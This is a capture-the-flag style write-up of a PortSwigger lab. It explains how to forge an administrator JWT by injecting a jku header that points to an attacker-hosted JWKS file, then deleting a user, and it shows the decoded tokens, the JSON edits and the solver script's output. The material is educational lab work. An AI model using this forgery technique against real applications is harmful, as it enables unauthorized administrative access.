# Lab: JWT authentication bypass via jku header injection

### Instructions

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user carlos.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can login with the provided credentials and a JWT is set:

```
eyJraWQiOiJkZjczZjdmMy0zOWE2LTRkZTEtYTY5OC01NTNmOTI1ZThkN2UiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDg1MzA5MCwic3ViIjoid2llbmVyIn0.GkxpqdyxwZsy5MZWzAAkiFDucMvPWki7NQ4hGfdBkx_U8kJaD8Sq6wePBQjDJm4un-vbkSauzmD-X7Gi08QKKDVZUj7iBZBMPizT0ppyJRZieRtQMzoZC3_QvC7EkFX4vOBUPC4xlNspMqqJkI96qeuyO0L9t9TmGrib9HBvuFdQvSzWvKPSML4Fs5ZqgeSuEXwtbqeWgmCTYQwJiYLEE00MSs5V5HqH3ziL2t-zs1Kz2GnK6rD1ilJVkc3lK4_ffQ2JKDp7wTFgqFUUYX_j8PC8VuYnIai8gxxiTkLx4hnDoXORPLdvMB0cEfvj6oGKlN-wB_MyJ9BsuQ84d6BL9w
```

Dropping this into jwt.io or using the JWT Editor extension in Burp we find the header and payload:

```json
{
  "kid": "df73f7f3-39a6-4de1-a698-553f925e8d7e",
  "alg": "RS256"
}
```

```json
{
  "iss": "portswigger",
  "exp": 1794853090,
  "sub": "wiener"
}
```

Nothing in the header tells us a `jku` is supported, we just know from the lab description that the server trusts a `jku` URL without checking it belongs to a trusted domain. So we add the field ourselves.

In Burp's JWT Editor, we first edit the payload to escalate our privileges:

```json
{
  "iss": "portswigger",
  "exp": 1794853090,
  "sub": "administrator"
}
```

Then we generate a new RSA key pair in JWT Editor, and edit the header to add a `jku` pointing at a JWKS file we control:

```json
{
  "kid": "df73f7f3-39a6-4de1-a698-553f925e8d7e",
  "alg": "RS256",
  "jku": "https://exploit-xxxx.exploit-server.net/jwks.json"
}
```

For that URL to actually work, we need to host a JWKS file there containing the public half of the key we just generated. JWT Editor can export the public key as a JWK, which we drop into the exploit server's "Store" tab at a path like `/jwks.json`:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "df73f7f3-39a6-4de1-a698-553f925e8d7e",
      "n": "..."
    }
  ]
}
```

With the file hosted, we sign our edited token (the one with `sub: administrator` in the payload and `jku` in the header) using our RSA key, and send the request to `/my-account`. The server fetches our JWKS from the `jku` URL we gave it, finds a key matching the `kid`, and uses it to verify the signature we just created, so it accepts the token and treats us as administrator.

From there we can hit `/admin` and delete the carlos user to solve the lab.

### Python Solution

See `jwt_05.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/JWT_Attacks/JWT_05_jwt_authentication_bypass_via_jku_header_injection]
└─$ python jwt_05.py https://0a80007b0458819b8169add900590005.web-security-academy.net/
[+] Found exploit server: https://exploit-0a69008104e981d78183acd701a20017.exploit-server.net
[+] Logged in as wiener
[+] Hosted JWKS on exploit server and forged session cookie with jku header
[+] Deleted carlos
[+] Lab solved!
```
